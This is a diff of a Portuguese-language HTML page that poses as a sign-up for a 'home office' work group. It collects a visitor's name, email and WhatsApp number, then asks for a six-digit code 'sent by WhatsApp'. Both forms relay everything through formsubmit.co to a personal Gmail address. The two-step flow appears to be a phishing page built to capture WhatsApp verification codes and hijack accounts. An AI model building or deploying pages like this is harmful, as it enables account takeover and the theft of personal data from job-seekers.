@@ -1,101 +1,74 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Cadastro Home Office</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Formulários de Entrada</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       background: #f0f0f0;
       padding: 20px;
     }
-    .box {
+    .container {
+      max-width: 400px;
+      margin: auto;
       background: #fff;
       padding: 25px;
-      max-width: 400px;
-      margin: 40px auto;
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      margin-bottom: 40px;
     }
-    input, button {
+    h2 {
+      margin-bottom: 10px;
+    }
+    input {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
-      font-size: 16px;
-      border-radius: 8px;
+      border-radius: 6px;
       border: 1px solid #ccc;
     }
     button {
-      background: #007bff;
-      color: #fff;
+      width: 100%;
+      padding: 12px;
+      background-color: #4CAF50;
       border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 6px;
       cursor: pointer;
     }
-    button:hover {
-      background: #0056b3;
+    button.blue {
+      background-color: #2196F3;
     }
   </style>
 </head>
 <body>
 
-  <!-- Etapa 1 -->
-  <div class="box" id="etapa1">
-    <h2>Participe do grupo de Home Office</h2>
-    <form id="formEtapa1">
+  <!-- Formulário 1 -->
+  <div class="container">
+    <h2>Entrar para o Grupo</h2>
+    <p>Preencha os dados para continuar:</p>
+    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
       <input type="text" name="nome" placeholder="Seu nome" required>
       <input type="email" name="email" placeholder="Seu e-mail" required>
-      <input type="text" name="whatsapp" placeholder="Número do WhatsApp" required>
-      <button type="submit">Avançar</button>
+      <input type="text" name="whatsapp" placeholder="Seu WhatsApp com DDD" required>
+      <input type="hidden" name="_subject" value="Novo cadastro - Home Office">
+      <button type="submit">Enviar dados</button>
     </form>
   </div>
 
-  <!-- Etapa 2 -->
-  <div class="box" id="etapa2" style="display:none">
-    <h2>Confirme sua participação</h2>
-    <form id="formEtapa2">
-      <input type="text" name="codigo" placeholder="Digite o código de 6 dígitos" maxlength="6" required>
-      <button type="submit">Finalizar</button>
+  <!-- Formulário 2 -->
+  <div class="container">
+    <h2>Confirme o Código</h2>
+    <p>Digite o código de 6 dígitos enviado por WhatsApp:</p>
+    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+      <input type="text" name="codigo_confirmacao" placeholder="Ex: 123456" required pattern="\d{6}" maxlength="6">
+      <input type="hidden" name="_subject" value="Código de Confirmação">
+      <button type="submit" class="blue">Confirmar Código</button>
     </form>
   </div>
-
-  <!-- Mensagem final -->
-  <div class="box" id="final" style="display:none">
-    <h2>Obrigado!</h2>
-    <p>Você concluiu o cadastro.</p>
-  </div>
-
-  <script>
-    const etapa1 = document.getElementById("etapa1");
-    const etapa2 = document.getElementById("etapa2");
-    const final = document.getElementById("final");
-
-    // Envio da etapa 1
-    document.getElementById("formEtapa1").addEventListener("submit", function(e) {
-      e.preventDefault();
-      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        body: new FormData(this),
-        headers: { 'Accept': 'application/json' }
-      }).then(() => {
-        etapa1.style.display = "none";
-        etapa2.style.display = "block";
-      });
-    });
-
-    // Envio da etapa 2
-    document.getElementById("formEtapa2").addEventListener("submit", function(e) {
-      e.preventDefault();
-      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        body: new FormData(this),
-        headers: { 'Accept': 'application/json' }
-      }).then(() => {
-        etapa2.style.display = "none";
-        final.style.display = "block";
-      });
-    });
-  </script>
 
 </body>
 </html>
